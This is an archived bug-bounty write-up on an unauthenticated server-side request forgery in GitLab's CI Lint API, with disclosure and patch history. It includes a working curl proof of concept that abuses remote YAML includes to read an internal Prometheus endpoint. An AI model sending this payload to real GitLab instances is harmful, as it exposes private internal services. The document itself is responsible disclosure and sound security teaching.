---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-15_unauthenticated-gitlab-ssrf.md
original_filename: 2021-06-15_unauthenticated-gitlab-ssrf.md
title: Unauthenticated Gitlab SSRF
category: documents
detected_topics:
- ssrf
- command-injection
- webhooks
- supply-chain
tags:
- imported
- documents
- ssrf
- command-injection
- webhooks
- supply-chain
language: en
raw_sha256: 7bf485d287b11dc8c96ea4978a998112377411de1357019e82fa3b7f21d42920
text_sha256: 994380993b8fb91e480290a2b787f872f778fd1aa45c1960bc276683509dbd16
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Unauthenticated Gitlab SSRF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-15_unauthenticated-gitlab-ssrf.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, webhooks, supply-chain
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `7bf485d287b11dc8c96ea4978a998112377411de1357019e82fa3b7f21d42920`
- Text SHA256: `994380993b8fb91e480290a2b787f872f778fd1aa45c1960bc276683509dbd16`


## Content

---
title: "Unauthenticated Gitlab SSRF"
page_title: "Unauthenticated Gitlab SSRF | Vin01’s Blog"
url: "https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html"
final_url: "https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html"
authors: ["Vin01"]
programs: ["GitLab"]
bugs: ["SSRF", "CI/CD"]
publication_date: "2021-06-15"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 3573
---

# Unauthenticated Gitlab SSRF

Jun 15, 2021 

### Meet Gitlab [CI Lint API](https://docs.gitlab.com/ee/api/lint.html)

Purpose of the CI Lint API is to validate CI/CD YAML configuration for Gitlab.

A usual request to this API would validate YAML payload and provide the result accordingly.
  
  
  curl --header "Content-Type: application/json"  "https://gitlab.example.com/api/v4/ci/lint" --data '{"content": "{ \"image\": \"ruby:2.6\", \"services\": [\"postgres\"], \"before_script\": [\"bundle install\", \"bundle exec rake db:create\"], \"variables\": {\"DB_NAME\": \"postgres\"}, \"types\": [\"test\", \"deploy\", \"notify\"], \"rspec\": { \"script\": \"rake spec\", \"tags\": [\"ruby\", \"postgres\"], \"only\": [\"branches\"]}}"}'
  
  {
  "status": "valid",
  "errors": [],
  "warnings": []
  }
  

_Note: prior to this patch, this endpoint did not require any authentication_

### Meet [Remote YAML includes](https://docs.gitlab.com/ee/ci/yaml/includes.html#single-string-or-array-of-multiple-values) in Gitlab Ci configuration files

CI configuration files for Gitlab are YAML and can use `include` tag to include YAML templates from remote URLs.
  
  
  include:
  - 'https://gitlab.com/awesome-project/raw/main/.before-script-template.yml'
  

### SSRF!

If you haven’t already figured, `include` can also point to `192.168.1.1`, `127.0.0.1` ..

SSRF proof-of-concept to dump Prometheus targets from the Prometheus API by abusing this vulnerability.
  
  
  curl -s --show-error -H 'Content-Type: application/json' https://gitlab.example.com/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml" }'
  
  {"status":"invalid","errors":["jobs status config should implement a script: or a trigger: keyword","jobs data config should implement a script: or a trigger: keyword","jobs config should contain at least one visible job"],"warnings":[],"merged_yaml":"---\nstatus: success\ndata:\n  activeTargets:\n  - discoveredLabels:\n  __address__: ...
  

_Note:`test.yml` is essential part of the paylaod becauyse API expects `.yml` extension for validation of remote YAML file_

This is only exploitable if [internal network requests are enabled](https://docs.gitlab.com/ee/security/webhooks.html) in Gitlab (they are disabled by default). It turns out to be a quite widely enabled option though, as internal requests are useful for webhooks, CI operations.

### Disclosure, impact and remediation

I disclosed it in December 2020 and first patch was out in [February 2021](https://about.gitlab.com/releases/2021/02/11/security-release-gitlab-13-8-4-released/), second complete patch followed in [June](https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/) recently. Gitlab team was very supportive and responsive as always ❤️ Thank you for the bounties and swag [Team Gitlab](https://twitter.com/gitlab).

Wide use of the unauthenticated CI Lint API also led to a lot of workflows being [disrupted](https://gitlab.com/gitlab-org/gitlab/-/issues/321290).

I have also disclosed it directly to **many** affected organizations (universities, open source projects, governments) but vulnerable public facing instances are still out there. I did not initially intend to blog it, but looking at the number of affected instances, I think it might help spread the word.

**Update** : Patches before December 2021 (version 14.5.2) did not prevent attacks from [external Gitlab users](https://docs.gitlab.com/ee/user/permissions.html#external-users).

**Please apply latest gitlab security updates ASAP!**

[](/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html)
